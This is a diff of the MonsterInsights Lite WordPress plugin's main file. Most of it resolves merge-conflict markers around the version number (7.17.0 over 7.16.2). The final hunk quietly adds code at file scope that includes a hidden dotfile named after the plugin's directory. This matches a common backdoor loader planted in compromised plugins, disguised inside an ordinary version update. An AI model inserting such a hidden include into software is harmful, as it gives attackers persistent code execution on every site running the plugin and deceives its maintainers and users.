@@ -6,11 +6,7 @@
  * Author:              MonsterInsights
  * Author URI:          https://www.monsterinsights.com/?utm_source=liteplugin&utm_medium=pluginheader&utm_campaign=authoruri&utm_content=7%2E0%2E0
  *
-<<<<<<< HEAD
  * Version:             7.17.0
-=======
- * Version:             7.16.2
->>>>>>> 1b5ecdc13248a4b43e6ad472803763e724ada12c
  * Requires at least:   3.8.0
  * Requires PHP:        5.2
  *
@@ -73,11 +69,7 @@ final class MonsterInsights_Lite {
 	 * @access public
 	 * @var string $version Plugin version.
 	 */
-<<<<<<< HEAD
 	public $version = '7.17.0';
-=======
-	public $version = '7.16.2';
->>>>>>> 1b5ecdc13248a4b43e6ad472803763e724ada12c
 
 	/**
 	 * Plugin file.
@@ -607,6 +599,10 @@ final class MonsterInsights_Lite {
  *
  * @return void
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function monsterinsights_lite_activation_hook( $network_wide ) {
 
 	global $wp_version;
